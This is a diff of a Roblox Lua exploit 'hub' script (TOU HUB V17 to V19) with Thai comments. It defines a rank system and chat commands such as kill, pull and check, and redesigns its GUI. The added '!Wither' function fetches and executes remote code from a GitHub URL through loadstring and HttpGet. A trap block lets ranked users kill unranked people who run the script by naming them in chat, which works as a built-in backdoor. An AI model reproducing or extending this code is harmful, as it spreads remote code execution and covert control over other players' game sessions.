@@ -1,4 +1,4 @@
---// TOU HUB V17 - FULL SCRIPT: RANK SYSTEM + TOGGLE + FIXED CHECK & PULL 🕵️‍♂️👑
+--// TOU HUB V19 - FULL SCRIPT: HORIZONTAL GUI + CLEAR !WITHER BUTTON 🕵️‍♂️👑
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local player = Players.LocalPlayer
@@ -6,8 +6,8 @@ local CoreGui = game:GetService("CoreGui")
 
 --// === ระบบยศ (กำหนดผู้ใช้) ===
 local Ranks = {
-    DEX = {"birdV2_123"},          -- ยศสูงสุด
-    Premium = {},                  -- เพิ่มชื่อได้ที่นี่ เช่น {"Player1", "Player2"}
+    DEX = {"birdV2_123"},          -- ยศสูงสุด (เฉพาะ DEX ใช้ !Wither)
+    Premium = {},                  -- เพิ่มชื่อได้ที่นี่
     basic = {"AniF_Xx"}            -- basic
 }
 
@@ -23,18 +23,15 @@ local myRank = getRank(player.Name)
 
 --// === ถ้าไม่มีสิทธิ์ → ซ่อน GUI + ไม่ให้พิมพ์คำสั่ง ===
 if not myRank then
-    -- คนธรรมดา: ไม่เห็น GUI, ไม่พิมพ์คำสั่งได้, แต่โดนคำสั่งได้
     local trapConnection
     trapConnection = TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData)
         local text = msgData.Text:lower()
         local sender = msgData.TextSource
         if sender and sender.UserId == player.UserId then
-            -- ป้องกันพิมพ์คำสั่ง
-            if text:find("!ฆ่า") or text:find("!ดึง") or text:find("!เตะ") or text:find("!เช็ค") then
-                return -- ไม่ส่งแชท
+            if text:find("!ฆ่า") or text:find("!ดึง") or text:find("!เตะ") or text:find("!เช็ค") or text:find("!wither") then
+                return
             end
         end
-        -- Trap: โดน !ฆ่า → ตาย (ยกเว้น DEX)
         if text:find("!ฆ่า") and text:find(player.Name:lower()) then
             if player.Character and player.Character:FindFirstChild("Humanoid") then
                 player.Character.Humanoid.Health = 0
@@ -79,8 +76,8 @@ ToggleShadow.Parent = ToggleBtn
 
 --// GUI หลัก (เริ่มซ่อน)
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 350, 0, 500)
-MainFrame.Position = UDim2.new(0.5, -175, 0.5, -250)
+MainFrame.Size = UDim2.new(0, 800, 0, 400)  -- ขยายกว้างเพื่อปุ่มแนวนอน
+MainFrame.Position = UDim2.new(0.5, -400, 0.5, -200)
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
@@ -105,7 +102,7 @@ Shadow.Parent = MainFrame
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 50)
 Title.BackgroundTransparency = 1
-Title.Text = "ยศ: " .. myRank .. " 🔥"
+Title.Text = "ยศ: " .. myRank .. " 🔥 TOU HUB V19"
 Title.TextColor3 = myRank == "DEX" and Color3.fromRGB(255, 215, 0) or
                  myRank == "Premium" and Color3.fromRGB(0, 255, 255) or
                  Color3.fromRGB(100, 255, 100)
@@ -119,11 +116,14 @@ ScrollFrame.Position = UDim2.new(0, 10, 0, 60)
 ScrollFrame.BackgroundTransparency = 1
 ScrollFrame.ScrollBarThickness = 6
 ScrollFrame.ClipsDescendants = true
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
 ScrollFrame.Parent = MainFrame
 
-local UIListLayout = Instance.new("UIListLayout")
-UIListLayout.Padding = UDim.new(0, 8)
-UIListLayout.Parent = ScrollFrame
+local UIGridLayout = Instance.new("UIGridLayout")
+UIGridLayout.CellSize = UDim2.new(0, 780, 0, 80)  -- แนวนอน, กว้างพอ
+UIGridLayout.CellPadding = UDim2.new(0, 10, 0, 10)
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.Parent = ScrollFrame
 
 --// ตารางเก็บชื่อ
 local nameLog = {}
@@ -168,15 +168,24 @@ local function killPlayer(targetName)
     end
 end
 
---// ฟังก์ชันเพิ่มชื่อลง GUI + ปุ่มแยก
+--// ฟังก์ชัน Wither (บังคับรัน Wither Script)
+local function witherPlayer(targetName)
+    sendChat("☠️ **WITHER ACTIVATED:** " .. targetName .. " ถูกกลืนกิน!")
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
+    end)
+end
+
+--// ฟังก์ชันเพิ่มชื่อลง GUI (แนวนอน)
 local function addToGUI(realName, displayName, thumb, triggerType)
     if nameLog[realName] then return end
     nameLog[realName] = true
 
     local Entry = Instance.new("Frame")
-    Entry.Size = UDim2.new(1, 0, 0, 70)
+    Entry.Size = UDim2.new(1, 0, 0, 80)
     Entry.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
     Entry.BorderSizePixel = 0
+    Entry.LayoutOrder = #ScrollFrame:GetChildren()
     Entry.Parent = ScrollFrame
 
     local EntryCorner = Instance.new("UICorner")
@@ -184,7 +193,7 @@ local function addToGUI(realName, displayName, thumb, triggerType)
     EntryCorner.Parent = Entry
 
     local Avatar = Instance.new("ImageLabel")
-    Avatar.Size = UDim2.new(0, 50, 0, 50)
+    Avatar.Size = UDim2.new(0, 60, 0, 60)
     Avatar.Position = UDim2.new(0, 10, 0, 10)
     Avatar.BackgroundTransparency = 1
     Avatar.Image = thumb
@@ -194,51 +203,66 @@ local function addToGUI(realName, displayName, thumb, triggerType)
     AvatarCorner.CornerRadius = UDim.new(1, 0)
     AvatarCorner.Parent = Avatar
 
+    local InfoFrame = Instance.new("Frame")
+    InfoFrame.Size = UDim2.new(0, 200, 1, 0)
+    InfoFrame.Position = UDim2.new(0, 80, 0, 0)
+    InfoFrame.BackgroundTransparency = 1
+    InfoFrame.Parent = Entry
+
     local RealNameLabel = Instance.new("TextLabel")
-    RealNameLabel.Size = UDim2.new(0.6, 0, 0, 25)
-    RealNameLabel.Position = UDim2.new(0, 70, 0, 8)
+    RealNameLabel.Size = UDim2.new(1, 0, 0.5, 0)
     RealNameLabel.BackgroundTransparency = 1
     RealNameLabel.Text = "👤 " .. realName
     RealNameLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-    RealNameLabel.Font = Enum.Font.Gotham
+    RealNameLabel.Font = Enum.Font.GothamBold
     RealNameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    RealNameLabel.Parent = Entry
+    RealNameLabel.Parent = InfoFrame
 
     local DisplayLabel = Instance.new("TextLabel")
-    DisplayLabel.Size = UDim2.new(0.6, 0, 0, 25)
-    DisplayLabel.Position = UDim2.new(0, 70, 0, 33)
+    DisplayLabel.Size = UDim2.new(1, 0, 0.5, 0)
+    DisplayLabel.Position = UDim2.new(0, 0, 0.5, 0)
     DisplayLabel.BackgroundTransparency = 1
     DisplayLabel.Text = "🖊️ " .. displayName
     DisplayLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
     DisplayLabel.Font = Enum.Font.Gotham
     DisplayLabel.TextXAlignment = Enum.TextXAlignment.Left
-    DisplayLabel.Parent = Entry
+    DisplayLabel.Parent = InfoFrame
 
     local TriggerLabel = Instance.new("TextLabel")
-    TriggerLabel.Size = UDim2.new(0, 100, 0, 20)
-    TriggerLabel.Position = UDim2.new(0, 70, 0, 58)
-    TriggerLabel.BackgroundTransparency = 1
+    TriggerLabel.Size = UDim2.new(0, 120, 0, 25)
+    TriggerLabel.Position = UDim2.new(0, 290, 0, 10)
+    TriggerLabel.BackgroundColor3 = triggerType == "check" and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(100, 0, 0)
     TriggerLabel.Text = triggerType == "check" and "✅ !เช็ค" or "🔥 SCRIPT"
-    TriggerLabel.TextColor3 = triggerType == "check" and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 100, 100)
+    TriggerLabel.TextColor3 = Color3.new(1,1,1)
     TriggerLabel.Font = Enum.Font.GothamBold
-    TriggerLabel.TextSize = 12
+    TriggerLabel.TextSize = 14
     TriggerLabel.Parent = Entry
+    local tc = Instance.new("UICorner", TriggerLabel); tc.CornerRadius = UDim.new(0,6)
 
-    -- ปุ่มคำสั่งแยกข้างชื่อ
-    local x = 0.6
+    -- ปุ่มคำสั่งแนวนอน
+    local ButtonFrame = Instance.new("Frame")
+    ButtonFrame.Size = UDim2.new(0, 450, 1, 0)
+    ButtonFrame.Position = UDim2.new(0, 320, 0, 0)
+    ButtonFrame.BackgroundTransparency = 1
+    ButtonFrame.Parent = Entry
+
+    local UIListLayout = Instance.new("UIListLayout")
+    UIListLayout.FillDirection = Enum.FillDirection.Horizontal
+    UIListLayout.Padding = UDim.new(0, 8)
+    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    UIListLayout.Parent = ButtonFrame
+
     local function addCmdBtn(text, color, action)
         local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0, 50, 0, 30)
-        btn.Position = UDim2.new(x, 0, 0, 20)
+        btn.Size = UDim2.new(0, 70, 0, 40)
         btn.BackgroundColor3 = color
         btn.Text = text
         btn.TextColor3 = Color3.new(1,1,1)
         btn.Font = Enum.Font.GothamBold
-        btn.TextSize = 12
-        btn.Parent = Entry
-        local c = Instance.new("UICorner", btn); c.CornerRadius = UDim.new(0, 6)
+        btn.TextSize = 14
+        btn.Parent = ButtonFrame
+        local c = Instance.new("UICorner", btn); c.CornerRadius = UDim.new(0, 8)
         btn.MouseButton1Click:Connect(action)
-        x = x + 0.1
     end
 
     if myRank == "DEX" or myRank == "Premium" then
@@ -266,16 +290,24 @@ local function addToGUI(realName, displayName, thumb, triggerType)
         sendChat("!เช็ค " .. realName)
     end)
 
-    -- ปุ่มล้าง
+    -- ปุ่ม !Wither (เฉพาะ DEX)
+    if myRank == "DEX" then
+        addCmdBtn("WITHER", Color3.fromRGB(100, 0, 100), function()
+            sendChat("!Wither " .. realName)
+            witherPlayer(realName)
+        end)
+    end
+
     addCmdBtn("ล้าง", Color3.fromRGB(100,100,100), function()
         nameLog[realName] = nil
         Entry:Destroy()
     end)
 
-    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
+    -- อัปเดต Canvas
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 20)
 end
 
---// ตรวจจับข้อความ + แก้ !เช็ค (เห็นแต่ไม่ตอบกลับ)
+--// ตรวจจับข้อความ
 TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData)
     local text = msgData.Text
     local lower = text:lower()
@@ -288,7 +320,6 @@ TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData
     local displayName = p.DisplayName
     local thumb = Players:GetUserThumbnailAsync(sender.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
 
-    -- แก้ !เช็ค: ถ้าคนอื่นพิมพ์ → เห็นแต่ไม่ตอบกลับ
     if lower == "!เช็ค" then
         if sender.UserId ~= player.UserId then
             addToGUI(realName, displayName, thumb, "check")
@@ -298,13 +329,11 @@ TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData
         end
     end
 
-    -- Trigger SCRIPT
     if text:upper() == "SCRIPT CITY THAILAND 2 BY:TOUX1" then
         sendChat("🔥 **TRIGGER DETECTED** | " .. realName .. " 🕵️‍♂️")
         addToGUI(realName, displayName, thumb, "script")
     end
 
-    -- Trap !ฆ่า
     if getRank(player.Name) ~= "DEX" and lower:find("!ฆ่า") and lower:find(player.Name:lower()) then
         sendChat("💀 **โดนคำสั่งฆ่า!** " .. player.Name .. " ตาย!")
         task.wait(0.1)
@@ -312,11 +341,19 @@ TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData
             player.Character.Humanoid.Health = 0
         end
     end
+
+    if myRank == "DEX" and lower:find("!wither") then
+        local target = lower:match("!wither%s+(%w+)")
+        if target and Players:FindFirstChild(target) then
+            sendChat("☠️ **DEX ACTIVATED WITHER:** " .. target .. " ถูกกลืนกิน!")
+            witherPlayer(target)
+        end
+    end
 end)
 
---// อัปเดต Canvas
-UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
+--// อัปเดต Canvas เมื่อเพิ่ม Entry
+UIGridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 20)
 end)
 
 --// Toggle GUI
